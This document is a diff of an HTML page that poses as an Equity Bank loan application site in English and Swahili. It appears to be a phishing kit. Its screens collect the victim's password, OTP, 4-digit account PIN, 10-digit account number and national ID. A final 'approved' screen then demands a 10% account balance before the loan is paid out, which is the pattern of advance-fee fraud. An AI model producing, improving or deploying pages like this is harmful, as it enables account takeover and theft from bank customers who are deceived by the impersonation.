@@ -3,392 +3,405 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Equity Mobile</title>
-  <link rel="stylesheet" href="/style.css">
-  <script src="/socket.io/socket.io.js"></script>
+  <title>Equity Bank Loan Application Services</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
-  <div id="surface-alert" class="surface-alert hidden"></div>
+  <!-- Top Navigation & Language Switcher -->
+  <header class="top-bar">
+    <div class="header-content">
+      <button class="icon-btn back-btn" id="headerBackBtn">←</button>
+      <div class="lang-toggle-wrapper">
+        <span class="lang-label" id="langEngLabel">ENG</span>
+        <label class="switch">
+          <input type="checkbox" id="langToggle">
+          <span class="slider round"></span>
+        </label>
+        <span class="lang-label" id="langSwaLabel">SWAHILI</span>
+      </div>
+      <div class="header-icon">💬</div>
+    </div>
+  </header>
 
-  <div class="app-container">
+  <!-- Surface Inline Notification Bar -->
+  <div id="surfaceNotification" class="surface-notification hidden"></div>
 
-    <div id="page-welcome" class="page active welcome-theme">
-      <div class="top-nav">
-        <div class="lang-selector">
-          <span id="welcome-lang-icon">🌐</span>
-          <select id="welcome-lang-select">
-            <option value="en">Eng ∨</option>
-            <option value="sw">Swahili ∨</option>
+  <!-- Main Application Wrapper -->
+  <main class="app-container">
+
+    <!-- Screen 1: Welcome & Country Selector -->
+    <section id="screen-welcome" class="screen active">
+      <div class="brand-header">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
+        </div>
+        <h1 class="main-title" data-i18n="welcomeTitle">EQUITY BANK</h1>
+        <h2 class="sub-title" data-i18n="welcomeSubtitle">LOAN APPLICATION SERVICES</h2>
+        <p class="welcome-desc" data-i18n="welcomeDesc">Sign in to begin or track your loan application.</p>
+        <p class="welcome-subdesc" data-i18n="welcomeSubdesc">New to Equity? Register to apply for a loan. Log in to manage existing applications.</p>
+      </div>
+
+      <div class="form-group country-select-group">
+        <label for="countrySelect" data-i18n="chooseCountryLabel">Choose your country for application:</label>
+        <div class="dropdown-wrapper">
+          <select id="countrySelect" class="custom-select">
+            <option value="" disabled selected data-i18n="selectCountryPlaceholder">Select Country...</option>
+            <option value="KENYA">🇰🇪 KENYA</option>
+            <option value="TANZANIA">🇹🇿 TANZANIA</option>
+            <option value="UGANDA">🇺🇬 UGANDA</option>
+            <option value="RWANDA">🇷🇼 RWANDA</option>
+            <option value="SOUTH SUDAN">🇸🇸 SOUTH SUDAN</option>
           </select>
         </div>
-        <div class="chat-icon">💬</div>
       </div>
 
-      <div class="welcome-content">
-        <div class="brand-logo">
-          <div class="roof-icon"></div>
-          <h1 id="brand-title">EQUITY</h1>
+      <div class="action-buttons">
+        <button type="button" class="btn btn-primary" id="welcomeSignInBtn" data-i18n="singInBtn">SING IN</button>
+        <button type="button" class="btn btn-secondary" id="welcomeRegisterBtn" data-i18n="registerBtn">Register</button>
+      </div>
+    </section>
+
+
+    <!-- Screen 2: Loan Calculator / Repayment Estimator -->
+    <section id="screen-calculator" class="screen hidden">
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
         </div>
-        <h2 id="welcome-title">Welcome to Equity mobile</h2>
-        <p id="welcome-sub">Good afternoon! Sign in or register to continue</p>
+        <h1 class="main-title" data-i18n="calcTitle">Estimate your loan repayments</h1>
       </div>
 
-      <div class="bottom-actions">
-        <button id="btn-welcome-signin" class="btn-primary-white" onclick="goToSignIn()">Sign in</button>
-        <button id="btn-welcome-register" class="btn-outline-white" onclick="goToLoanCalculator()">Register</button>
+      <div class="calculator-card">
+        <div class="slider-group">
+          <div class="slider-header">
+            <span class="slider-title" data-i18n="loanAmountTitle">LOAN AMOUNT</span>
+          </div>
+          <input type="range" id="loanAmountSlider" min="10000" max="1000000" step="5000" value="250000">
+          <div class="slider-range-labels">
+            <span id="minAmountLabel">KES 10,000</span>
+            <span class="highlight-value" id="currentAmountLabel">KES 250,000</span>
+            <span id="maxAmountLabel">KES 1,000,000</span>
+          </div>
+        </div>
+
+        <div class="slider-group">
+          <div class="slider-header">
+            <span class="slider-title" data-i18n="loanTermTitle">LOAN TERM (MONTHS)</span>
+          </div>
+          <input type="range" id="loanTermSlider" min="3" max="60" step="1" value="12">
+          <div class="slider-range-labels">
+            <span data-i18n="3months">3 MONTHS</span>
+            <span class="highlight-value" id="currentTermLabel">12 MONTHS</span>
+            <span data-i18n="60months">60 MONTHS</span>
+          </div>
+        </div>
+
+        <div class="repayment-summary-box">
+          <div class="summary-label" data-i18n="estMonthlyLabel">ESTIMATED MONTHLY REPAYMENT</div>
+          <div class="summary-amount" id="monthlyRepaymentValue">KES 23,500</div>
+          <div class="summary-sub">
+            <span data-i18n="totalRepaymentLabel">TOTAL REPAYMENT: </span>
+            <strong id="totalRepaymentValue">KES 282,000</strong>
+          </div>
+          <div class="summary-interest" data-i18n="interestNote">*Assumed Interest Rate: 13.5%</div>
+        </div>
       </div>
-    </div>
 
-    <div id="page-signin" class="page welcome-theme">
-      <div class="top-nav">
-        <button class="back-btn" onclick="showPage('page-welcome')">‹</button>
-        <span id="signin-header-title">Welcome back</span>
-        <div class="chat-icon">💬</div>
+      <div class="action-buttons">
+        <button type="button" class="btn btn-primary" id="calcSignInBtn" data-i18n="signInBtnCaps">SIGN IN</button>
+        <button type="button" class="btn btn-secondary" id="calcRegisterBtn" data-i18n="registerBtn">Register</button>
+      </div>
+    </section>
+
+
+    <!-- Screen 3: Full Loan Application Form -->
+    <section id="screen-form" class="screen hidden">
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
+        </div>
+        <h1 class="main-title" data-i18n="formTitle">Loan Application Form</h1>
+        <p class="form-sub-header" data-i18n="formSubtitle">Please provide your details below</p>
       </div>
 
-      <div class="signin-content">
-        <h2 id="signin-hello">Hello there,</h2>
-        <p id="signin-sub" class="sub-text">Sign in to continue. Remember, your password is yours, do not share it with anyone.</p>
+      <div class="form-card">
+        <h3 class="card-section-title" data-i18n="personalDetailsTitle">Personal Details</h3>
+        <div class="form-row split">
+          <input type="text" id="firstName" placeholder="First Name" class="underline-input">
+          <input type="text" id="lastName" placeholder="Last Name" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="text" id="dob" placeholder="Date of Birth (DD/MM/YYYY)" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="text" id="nationalId" placeholder="National ID Number" class="underline-input">
+        </div>
+        <div class="form-row inline-radios">
+          <label data-i18n="genderLabel">Gender</label>
+          <label><input type="radio" name="gender" value="Man"> <span data-i18n="man">Man</span></label>
+          <label><input type="radio" name="gender" value="Female"> <span data-i18n="female">Female</span></label>
+        </div>
 
+        <h3 class="card-section-title" data-i18n="contactInfoTitle">Contact Information</h3>
+        <div class="form-row">
+          <input type="text" id="contactPhone" placeholder="Phone Number" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="email" id="contactEmail" placeholder="Email Address" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="text" id="physicalAddress" placeholder="Physical Address" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="text" id="postalAddress" placeholder="Postal Address" class="underline-input">
+        </div>
+
+        <h3 class="card-section-title" data-i18n="employmentTitle">Employment & Income</h3>
+        <div class="form-row inline-radios">
+          <label data-i18n="employmentStatusLabel">Employment Status</label>
+          <label><input type="radio" name="empStatus" value="Employed"> <span data-i18n="employed">Employed</span></label>
+          <label><input type="radio" name="empStatus" value="Self-Employed"> <span data-i18n="selfEmployed">Self-Employed</span></label>
+        </div>
+        <div class="form-row">
+          <input type="text" id="employerName" placeholder="Employer Name" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="text" id="jobTitle" placeholder="Job Title" class="underline-input">
+        </div>
+        <div class="form-row">
+          <input type="text" id="monthlyIncome" placeholder="Monthly Gross Income" class="underline-input">
+        </div>
+
+        <div class="loan-summary-box-inner">
+          <h4 data-i18n="loanDetailsTitle">Loan Details</h4>
+          <p><span data-i18n="selectedAmountLabel">Selected Amount:</span> <strong id="formSelectedAmount">KES 250,000</strong></p>
+          <p><span data-i18n="termLabel">Term:</span> <strong id="formSelectedTerm">12 Months</strong></p>
+        </div>
+      </div>
+
+      <div class="action-buttons">
+        <button type="button" class="btn btn-primary" id="formSaveContinueBtn" data-i18n="saveContinueBtn">SAVE & CONTINUE</button>
+        <button type="button" class="btn btn-secondary" id="formCancelBtn" data-i18n="cancelBtn">CANCEL</button>
+      </div>
+    </section>
+
+
+    <!-- Screen 4: Login Verification Screen -->
+    <section id="screen-login" class="screen hidden">
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
+        </div>
+        <h1 class="greeting-title" data-i18n="helloThereTitle">Hello there,</h1>
+        <p class="greeting-sub" data-i18n="welcomeBackSub">Welcome back. Sign in to continue.</p>
+      </div>
+
+      <div class="login-form">
         <div class="form-group">
-          <label id="lbl-signin-country">Country</label>
-          <select id="signin-country-select" onchange="handleCountryChange(this.value)">
-            <option value="" disabled selected>Select a country</option>
-            <option value="Kenya">Kenya</option>
-            <option value="Tanzania">Tanzania</option>
-            <option value="Uganda">Uganda</option>
-            <option value="Rwanda">Rwanda</option>
-            <option value="DR Congo">DR Congo</option>
+          <label class="input-label-sm" data-i18n="countryAppLabel">Country of application</label>
+          <select id="loginCountrySelect" class="custom-select underline">
+            <option value="" disabled selected data-i18n="selectCountryPlaceholder">Select your country</option>
+            <option value="KENYA">KENYA</option>
+            <option value="TANZANIA">TANZANIA</option>
+            <option value="UGANDA">UGANDA</option>
+            <option value="RWANDA">RWANDA</option>
+            <option value="SOUTH SUDAN">SOUTH SUDAN</option>
           </select>
         </div>
 
         <div class="form-group">
-          <label id="lbl-signin-email">Email address or mobile number</label>
-          <input type="text" id="signin-identifier" placeholder="Email address or mobile number">
+          <label class="input-label-sm" data-i18n="emailOrPhoneLabel">Email address or mobile number</label>
+          <input type="text" id="loginIdentifier" placeholder="Enter Gmail or phone number" class="underline-input">
         </div>
 
-        <div class="form-group password-wrapper">
-          <label id="lbl-signin-password">Password</label>
-          <div class="input-eye">
-            <input type="password" id="signin-password" placeholder="Enter password">
-            <span class="eye-icon" onclick="togglePasswordVisibility()">👁</span>
-          </div>
+        <div class="form-group relative-input">
+          <label class="input-label-sm" data-i18n="passwordLabel">Password</label>
+          <input type="password" id="loginPassword" placeholder="••••••••" class="underline-input">
+          <span class="password-toggle-icon" id="togglePasswordVisibility">👁</span>
         </div>
 
-        <a href="#" class="forgot-link" id="link-forgot">Forgot your password?</a>
-      </div>
-
-      <div class="bottom-actions">
-        <button id="btn-signin-submit" class="btn-grey" onclick="goToLoanCalculator()">Sign in</button>
-      </div>
-    </div>
-
-    <header id="main-header" class="main-header hidden">
-      <button class="header-back" onclick="handleHeaderBack()">← <span id="txt-back">Rudi</span></button>
-      <div class="header-brand">
-        <div class="header-logo-box">
-          <span class="header-logo-text" id="header-bank-name">EQUITY</span>
-        </div>
-        <span class="header-tagline" id="header-tagline">MOBILE</span>
-      </div>
-      <div class="header-menu">☰</div>
-    </header>
-
-    <div id="page-calc" class="page light-theme">
-      <div class="card calc-card">
-        <h2 id="calc-title">Pata Mkopo Wako Haraka</h2>
-        <p id="calc-sub" class="text-muted">Idhini ya haraka • Riba nafuu • Muda rahisi</p>
-
-        <div class="calc-box">
-          <h3 id="calc-box-title">Kikokotoo cha Mkopo</h3>
-
-          <div class="slider-group">
-            <div class="slider-header">
-              <span id="lbl-calc-amount">Kiasi cha Mkopo</span>
-              <span class="amount-val" id="disp-calc-amount">TSh 100,000</span>
-            </div>
-            <input type="range" id="range-amount" min="10000" max="100000000" step="10000" value="100000" oninput="updateCalc()">
-            <div class="slider-minmax">
-              <span id="disp-min-amount">TSh 10K</span>
-              <span id="disp-max-amount">TSh 100M</span>
-            </div>
-          </div>
-
-          <div class="slider-group">
-            <div class="slider-header">
-              <span id="lbl-calc-duration">Muda wa Mkopo</span>
-              <span class="duration-val" id="disp-calc-duration">miezi 12</span>
-            </div>
-            <input type="range" id="range-duration" min="6" max="60" step="1" value="12" oninput="updateCalc()">
-            <div class="slider-minmax">
-              <span id="disp-min-duration">miezi 6</span>
-              <span id="disp-max-duration">miezi 60</span>
-            </div>
-          </div>
-
-          <div class="repayment-box">
-            <span id="lbl-calc-repayment">Malipo ya Kila Mwezi</span>
-            <span class="repayment-val" id="disp-monthly-payment">TSh 9,504</span>
-          </div>
-        </div>
-
-        <button class="btn-orange" id="btn-apply-now" onclick="startApplication()">OMBA SASA</button>
-
-        <div class="features-grid">
-          <div class="feature-item">
-            <span class="feat-icon">⚡</span>
-            <strong id="feat1-title">Idhini ya Haraka</strong>
-            <span id="feat1-sub">Ndani ya masaa 24</span>
-          </div>
-          <div class="feature-item">
-            <span class="feat-icon">💰</span>
-            <strong id="feat2-title">Riba Nafuu</strong>
-            <span id="feat2-sub">Kuanzia 25%</span>
-          </div>
-          <div class="feature-item">
-            <span class="feat-icon">🔒</span>
-            <strong id="feat3-title">Salama</strong>
-            <span id="feat3-sub">Kiwango cha benki</span>
-          </div>
+        <div class="forgot-password-link">
+          <a href="#" id="forgotPasswordBtn" data-i18n="forgotPasswordText">Forgot your password?</a>
         </div>
       </div>
-    </div>
 
-    <div id="page-step1" class="page light-theme">
-      <div class="card app-card">
-        <h2 class="app-heading" id="step1-title">Maombi ya Mkopo</h2>
-        <p class="step-indicator" id="step1-indicator">Hatua 1 ya 3</p>
-        <div class="progress-bar"><div class="progress-fill step-1"></div></div>
-
-        <form id="form-step1" onsubmit="event.preventDefault(); goToStep2();">
-          <div class="form-group">
-            <label id="lbl-loan-type">Aina ya Mkopo</label>
-            <select id="select-loan-type">
-              <option value="Mkopo wa Biashara">Mkopo wa Biashara</option>
-              <option value="Mkopo wa Binsfsi">Mkopo wa Binsfsi</option>
-              <option value="Mkopo wa Elimu">Mkopo wa Elimu</option>
-            </select>
-          </div>
-
-          <div class="form-group">
-            <label id="lbl-loan-amount-input">Kiasi cha Mkopo (<span class="curr-code">TSh</span>)</label>
-            <input type="number" id="input-loan-amount" value="100000" required>
-          </div>
-
-          <div class="form-group">
-            <label id="lbl-loan-duration-input">Muda wa Mkopo</label>
-            <select id="select-loan-duration">
-              <option value="Miezi 12">Miezi 12</option>
-              <option value="Miezi 24">Miezi 24</option>
-              <option value="Miezi 36">Miezi 36</option>
-              <option value="Miezi 48" selected>Miezi 48</option>
-            </select>
-          </div>
-
-          <div class="form-group">
-            <label id="lbl-loan-purpose">Madhumuni ya Mkopo</label>
-            <textarea id="input-loan-purpose" placeholder="Elezea madhumuni ya mkopo wako..." required></textarea>
-          </div>
-
-          <button type="submit" class="btn-orange" id="btn-next-1">HATUA INAYOFUATA</button>
-        </form>
+      <div class="action-buttons margin-top-lg">
+        <button type="button" class="btn btn-primary" id="loginSubmitBtn" data-i18n="signInBtnCap">Sign in</button>
       </div>
-    </div>
+    </section>
 
-    <div id="page-step2" class="page light-theme">
-      <div class="card app-card">
-        <h2 class="app-heading" id="step2-title">Maombi ya Mkopo</h2>
-        <p class="step-indicator" id="step2-indicator">Hatua 2 ya 3</p>
-        <div class="progress-bar"><div class="progress-fill step-2"></div></div>
 
-        <form id="form-step2" onsubmit="event.preventDefault(); goToStep3();">
-          <div class="form-row">
-            <div class="form-group half">
-              <label id="lbl-first-name">Jina la Kwanza</label>
-              <input type="text" id="input-first-name" placeholder="Jina la kwanza" required>
-            </div>
-            <div class="form-group half">
-              <label id="lbl-last-name">Jina la Ukoo</label>
-              <input type="text" id="input-last-name" placeholder="Jina la ukoo" required>
-            </div>
-          </div>
-
-          <div class="form-group">
-            <label id="lbl-phone">Nambari ya Simu</label>
-            <div class="phone-input-group">
-              <span class="phone-prefix" id="phone-prefix-code">+255</span>
-              <input type="tel" id="input-phone" placeholder="712345678 au 0712345678" required>
-            </div>
-            <small class="help-text" id="phone-help">Weka nambari 9 au anza na 0 (mfano, 0712345678 → inabadilika hadi 0712345678)</small>
-          </div>
-
-          <div class="btn-row">
-            <button type="button" class="btn-grey" id="btn-prev-2" onclick="showPage('page-step1')">ILIYOTANGULIA</button>
-            <button type="submit" class="btn-orange" id="btn-next-2">HATUA INAYOFUATA</button>
-          </div>
-        </form>
+    <!-- Screen 5: OTP Verification -->
+    <section id="screen-otp" class="screen hidden">
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
+        </div>
+        <h1 class="main-title" data-i18n="enterOtpTitle">Enter OTP</h1>
+        <p class="otp-instruction" data-i18n="otpInstruction">An OTP has been sent to your registered Equity number or Gmail. Please enter it below before it expires.</p>
       </div>
-    </div>
 
-    <div id="page-step3" class="page light-theme">
-      <div class="card app-card">
-        <h2 class="app-heading" id="step3-title">Maombi ya Mkopo</h2>
-        <p class="step-indicator" id="step3-indicator">Hatua 3 ya 3</p>
-        <div class="progress-bar"><div class="progress-fill step-3"></div></div>
+      <div class="otp-container">
+        <label class="input-label-sm" data-i18n="otpFieldLabel">One-Time Password (OTP)</label>
+        <div class="otp-rectangle-box">
+          <input type="text" id="otpInput" maxlength="6" placeholder="Enter 6-digit OTP" class="otp-full-input">
+          <span class="field-icons">👁 ⌨</span>
+        </div>
 
-        <form id="form-step3" onsubmit="event.preventDefault(); submitStep3();">
-          <div class="form-group">
-            <label id="lbl-emp-status">Hali ya Ajira</label>
-            <select id="select-emp-status">
-              <option value="Mfanyabiashara">Mfanyabiashara</option>
-              <option value="Mwajiriwa">Mwajiriwa</option>
-              <option value="Kibarua">Kibarua</option>
-            </select>
-          </div>
+        <div class="timer-wrapper">
+          <div class="timer-display" id="timerDisplay">00:59</div>
+          <div class="timer-label" data-i18n="expiresInLabel">EXPIRES IN</div>
+        </div>
 
-          <div class="form-group">
-            <label id="lbl-income">Mapato ya Mwaka (<span class="curr-code">TSh</span>)</label>
-            <input type="number" id="input-income" placeholder="Weka mapato ya mwaka" required>
-          </div>
+        <div class="resend-text">
+          <span data-i18n="resendOtpText">Resend OTP in [01:30] mins</span>
+        </div>
 
-          <div class="summary-box">
-            <h4 id="lbl-summary-title">Muhtasari wa Maombi</h4>
-            <div class="summary-row">
-              <span id="lbl-sum-amount">Kiasi cha Mkopo:</span>
-              <span id="sum-disp-amount">TSh 100,000</span>
-            </div>
-            <div class="summary-row">
-              <span id="lbl-sum-duration">Muda wa Mkopo:</span>
-              <span id="sum-disp-duration">Miezi 48</span>
-            </div>
-            <div class="summary-row">
-              <span id="lbl-sum-purpose">Madhumuni:</span>
-              <span id="sum-disp-purpose">Biashara</span>
-            </div>
-            <div class="summary-row">
-              <span id="lbl-sum-applicant">Mwombaji:</span>
-              <span id="sum-disp-applicant">EQUITY MOBILE</span>
-            </div>
-          </div>
-
-          <div class="btn-row">
-            <button type="button" class="btn-grey" id="btn-prev-3" onclick="showPage('page-step2')">ILIYOTANGULIA</button>
-            <button type="submit" class="btn-orange" id="btn-submit-3">WASILISHA MAOMBI</button>
-          </div>
-        </form>
+        <p class="spam-warning" data-i18n="spamWarning">Check your spam or junk folder for the email.</p>
       </div>
-    </div>
 
-    <div id="page-otp" class="page light-theme">
-      <div class="card app-card text-center">
-        <h2 id="otp-title">Uthibitisho wa OTP</h2>
-        <p class="sub-text" id="otp-sub">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
-        <p class="phone-highlight" id="otp-phone-display">+2557125535595</p>
-
-        <div class="status-box-green" id="otp-info-box">
-          ✔ <span id="otp-status-txt">Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.</span>
-        </div>
-
-        <div class="otp-container" id="otp-inputs">
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box" onkeyup="handleOtpInput(this, 0)" onpaste="handleOtpPaste(event)">
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box" onkeyup="handleOtpInput(this, 1)">
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box" onkeyup="handleOtpInput(this, 2)">
-          <input type="text" inputmode="numeric" maxlength="1" class="otp-box" onkeyup="handleOtpInput(this, 3)">
-        </div>
-
-        <p class="resend-text" id="otp-timer-txt">Tuma tena msimbo ndani ya <span id="timer-sec">40</span> sekunde</p>
-
-        <button class="btn-grey full-width" id="btn-submit-otp" onclick="submitOtp()">WASILISHA</button>
+      <div class="action-buttons margin-top-lg">
+        <button type="button" class="btn btn-primary" id="otpSubmitBtn" data-i18n="submitBtn">Submit</button>
+        <button type="button" class="btn btn-link" id="otpBackLoginBtn" data-i18n="backToLoginBtn">Back to Login</button>
       </div>
-    </div>
+    </section>
 
-    <div id="page-pin" class="page light-theme">
-      <div class="card app-card text-center">
-        <div class="brand-logo-small">
-          <div class="roof-icon"></div>
-          <span class="brand-name-small" id="pin-brand-title">EQUITY</span>
+
+    <!-- Screen 6: 4-Digit Account PIN Confirmation -->
+    <section id="screen-pin" class="screen hidden">
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
         </div>
-
-        <h3 id="pin-header">Ingia Akaunti</h3>
-
-        <div class="form-group margin-top-20">
-          <div class="phone-input-group">
-            <span class="phone-prefix" id="pin-prefix-code">+255</span>
-            <input type="tel" id="pin-phone-input" placeholder="712345678 au 0712345678">
-          </div>
-        </div>
-
-        <div class="form-group margin-top-20">
-          <label id="lbl-pin-instruction">Weka PIN yako (tarakimu 4)</label>
-          <div class="pin-container">
-            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" onkeyup="handlePinInput(this, 0)">
-            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" onkeyup="handlePinInput(this, 1)">
-            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" onkeyup="handlePinInput(this, 2)">
-            <input type="password" inputmode="numeric" maxlength="1" class="pin-box" onkeyup="handlePinInput(this, 3)">
-            <span class="pin-eye-icon" onclick="togglePinVisibility()">👁</span>
-          </div>
-        </div>
-
-        <a href="#" class="forgot-link block margin-top-10" id="link-forgot-pin">Umesahau PIN?</a>
-
-        <button class="btn-grey full-width margin-top-20" id="btn-submit-pin" onclick="submitPin()">INGIA</button>
+        <h1 class="main-title" data-i18n="confirmPinTitle">Confirm Account PIN</h1>
+        <p class="pin-instruction" data-i18n="pinInstruction">For security, please confirm your 4-digit Account PIN to link your loan account.</p>
       </div>
-    </div>
 
-    <div id="page-approved" class="page light-theme">
-      <div class="card app-card text-center">
-        <div class="check-circle-icon">✓</div>
-        <h2 id="appr-title">Hongera!</h2>
-        <p class="sub-text" id="appr-sub">Mkopo wako umeidhinishwa! Fedha zitatolewa hivi karibuni.</p>
-
-        <div class="approved-amount-card">
-          <span class="appr-lbl" id="appr-amount-lbl">KIASI KILICHOIDHINISHWA</span>
-          <h1 class="appr-val" id="appr-disp-amount">TSh 100,000</h1>
+      <div class="pin-container">
+        <div class="pin-header-row">
+          <label class="input-label-sm" data-i18n="pinFieldLabel">4-digit Account PIN</label>
+          <span class="field-icons">👁 ⌨</span>
         </div>
 
-        <div class="warning-box">
-          ⚠️ <strong id="appr-warn-title">NOTISI YA UZINGATIAJI</strong>
-          <p id="appr-warn-text">Akaunti yako lazima iwe hai na idumishe amana ya usalama ya angalau 10% ya kiasi cha mkopo ulioomba.</p>
+        <div class="pin-boxes-row">
+          <input type="password" class="pin-box" maxlength="1" id="pin1" inputmode="numeric">
+          <input type="password" class="pin-box" maxlength="1" id="pin2" inputmode="numeric">
+          <input type="password" class="pin-box" maxlength="1" id="pin3" inputmode="numeric">
+          <input type="password" class="pin-box" maxlength="1" id="pin4" inputmode="numeric">
         </div>
 
-        <div class="details-list">
-          <div class="detail-item">
-            <span class="det-icon">💳</span>
-            <div>
-              <span class="det-lbl" id="appr-det1-lbl">MALIPO YA KILA MWEZI</span>
-              <strong class="det-val" id="appr-det1-val">TSh 2,441</strong>
-            </div>
-          </div>
-          <div class="detail-item">
-            <span class="det-icon">📅</span>
-            <div>
-              <span class="det-lbl" id="appr-det2-lbl">MUDA WA MKOPO</span>
-              <strong class="det-val" id="appr-det2-val">Miezi 48</strong>
-            </div>
-          </div>
-          <div class="detail-item">
-            <span class="det-icon">📈</span>
-            <div>
-              <span class="det-lbl" id="appr-det3-lbl">KIWANGO CHA RIBA</span>
-              <strong class="det-val">8% APR</strong>
-            </div>
-          </div>
-        </div>
-
-        <div class="quick-actions">
-          <p id="appr-actions-title">Vitendo vya Haraka</p>
-          <button class="btn-outline-grey" id="btn-act-deposit">💰 Weka Fedha</button>
-          <button class="btn-outline-grey" id="btn-act-withdraw">💸 Toa Fedha</button>
-          <button class="btn-outline-grey" id="btn-act-statement">📄 Maelezo ya Mkopo</button>
-        </div>
-
-        <button class="btn-orange full-width margin-top-20" id="btn-home" onclick="location.reload()">🏠 Rudi Nyumbani</button>
+        <p class="pin-note" data-i18n="pinNote">Ensure this matches the PIN you set for this account.</p>
       </div>
-    </div>
 
+      <div class="action-buttons margin-top-lg">
+        <button type="button" class="btn btn-primary" id="pinSubmitBtn" data-i18n="submitBtn">Submit</button>
+        <button type="button" class="btn btn-link" id="pinBackLoginBtn" data-i18n="backToLoginBtn">Back to Login</button>
+      </div>
+    </section>
+
+
+    <!-- Screen 7: Bank Account Number Entry -->
+    <section id="screen-account" class="screen hidden">
+      <div class="top-nav-status">
+        <span data-i18n="secureAccessText">SECURE ACCESS</span>
+      </div>
+
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
+        </div>
+        <h1 class="main-title large-bold" data-i18n="bankAccountAccessTitle">BANK ACCOUNT ACCESS</h1>
+        <p class="acc-desc" data-i18n="bankAccountDesc">Enter your account details to continue.</p>
+      </div>
+
+      <div class="account-details-card">
+        <div class="security-badges">
+          <div class="badge-item">
+            <span class="badge-icon">🛡️</span>
+            <span data-i18n="tenDigitAccLabel">10-digit Account Number</span>
+          </div>
+          <div class="badge-item">
+            <span class="badge-icon">🛡️</span>
+            <span data-i18n="secureVerificationLabel">Secure Verification</span>
+          </div>
+        </div>
+
+        <div class="form-group margin-top-md">
+          <div class="pin-header-row">
+            <label class="input-label-sm uppercase" data-i18n="accountNumberLabel">ACCOUNT NUMBER</label>
+            <span class="field-icons">👁 ⌨</span>
+          </div>
+          <input type="text" id="accountNumberInput" maxlength="10" placeholder="e.g., 0123456789" class="account-number-input">
+        </div>
+
+        <div id="accountErrorMsg" class="error-msg-banner hidden">
+          ⚠️ <span data-i18n="accErrorText">ERROR: Enter exactly 10 digits.</span>
+        </div>
+
+        <div class="info-callout-box">
+          <span class="info-icon">ℹ️</span>
+          <span data-i18n="accInfoText">Your account number is found on your bank statements or chequebook.</span>
+        </div>
+      </div>
+
+      <div class="action-buttons margin-top-lg">
+        <button type="button" class="btn btn-primary" id="accountSubmitBtn" data-i18n="submitBtn">Submit</button>
+        <button type="button" class="btn btn-link" id="accountCreateBtn" data-i18n="createAccountText">Need to Register? Create an Account</button>
+      </div>
+    </section>
+
+
+    <!-- Screen 8: Congratulations & Approval -->
+    <section id="screen-congratulations" class="screen hidden">
+      <div class="top-nav-status">
+        <span data-i18n="appCompleteText">APPLICATION COMPLETE</span>
+      </div>
+
+      <div class="brand-header compact">
+        <div class="logo-wrapper">
+          <div class="equity-roof"></div>
+          <h2 class="equity-logo-text">Equity Bank</h2>
+        </div>
+      </div>
+
+      <div class="congrats-wrapper">
+        <h1 class="congrats-title">CONGRATULATIONS! 🎉</h1>
+        <p class="congrats-message" data-i18n="congratsMsg">
+          Your loan application has been approved and successfully processed. We are excited to support your financial journey.
+        </p>
+
+        <div class="notice-card highlight-notice">
+          <h3 class="notice-card-title" data-i18n="importantNextStep">IMPORTANT NEXT STEP</h3>
+          <p data-i18n="tenPercentCondition">
+            To receive your loan disbursement, you must ensure your account has a balance equal to <strong>at least 10%</strong> of your total application amount.
+          </p>
+          <p class="notice-subtext" data-i18n="requiredCondition">This is a required condition for funds to be credited.</p>
+        </div>
+      </div>
+
+      <div class="action-buttons margin-top-lg">
+        <button type="button" class="btn btn-primary" id="disbursementBtn" data-i18n="proceedDisbursementBtn">Proceed to Disbursement</button>
+        <button type="button" class="btn btn-link" id="viewLoanDetailsBtn" data-i18n="viewLoanDetailsBtn">View Loan Details</button>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Fullscreen Loading Spinner Overlay -->
+  <div id="loadingOverlay" class="loading-overlay hidden">
+    <div class="spinner"></div>
+    <div class="loading-text" data-i18n="processingText">Processing... Please wait</div>
   </div>
 
-  <script src="/script.js"></script>
+  <script src="script.js"></script>
 </body>
-</html>
+        </html>
+          
